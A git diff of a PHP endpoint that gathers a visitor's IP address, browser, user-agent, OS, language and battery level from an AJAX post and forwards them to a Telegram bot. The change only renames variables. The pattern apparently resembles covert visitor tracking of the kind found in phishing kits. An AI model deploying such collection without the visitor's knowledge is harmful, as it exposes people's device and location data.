@@ -3,30 +3,27 @@ require_once __DIR__ . '/config.php';
 require_once __DIR__ . '/ip_utils.php';
 require_once __DIR__ . '/telegram.php';
 
-// Datos recibidos por AJAX
-$agent       = $_POST['agent']       ?? 'Unknown';
-$navegador   = $_POST['navegador']   ?? 'Unknown';
-$versionapp  = $_POST['versionapp']  ?? 'Unknown';
-$dystro      = $_POST['dystro']      ?? 'Unknown';
-$idioma      = $_POST['idioma']      ?? 'Unknown';
-$bateri      = $_POST['bateri']      ?? 'Unknown';
-
-// IP del visitante
 $ip = get_client_ip();
+$navegador = $_POST['navegador'] ?? 'Unknown';
+$user_agent = $_POST['user_agent'] ?? 'Unknown';
+$version_app = $_POST['version_app'] ?? 'Unknown';
+$sistema = $_POST['sistema'] ?? 'Unknown';
+$idioma = $_POST['idioma'] ?? 'Unknown';
+$bateria = $_POST['bateria'] ?? 'Unknown';
+
 $ts = gmdate('c');
 
-// Mensaje a Telegram
 $msg = "📱 <b>Info del dispositivo</b>\n".
        "📌 IP: $ip\n".
-       "🖥️ Navegador: $navegador\n".
-       "🧩 User-Agent: $agent\n".
-       "💻 Versión App: $versionapp\n".
-       "🖲 Sistema: $dystro\n".
+       "🖥 Navegador: $navegador\n".
+       "🧩 User-Agent: $user_agent\n".
+       "💻 Versión App: $version_app\n".
+       "🖲 Sistema: $sistema\n".
        "🌐 Idioma: $idioma\n".
-       "🔋 Batería: $bateri%\n".
+       "🔋 Batería: $bateria%\n".
        "⏰ Hora: $ts";
 
 send_to_telegram($msg);
 
-// Respuesta JSON
+// Retornar JSON opcional
 echo json_encode(['status' => 'ok']);
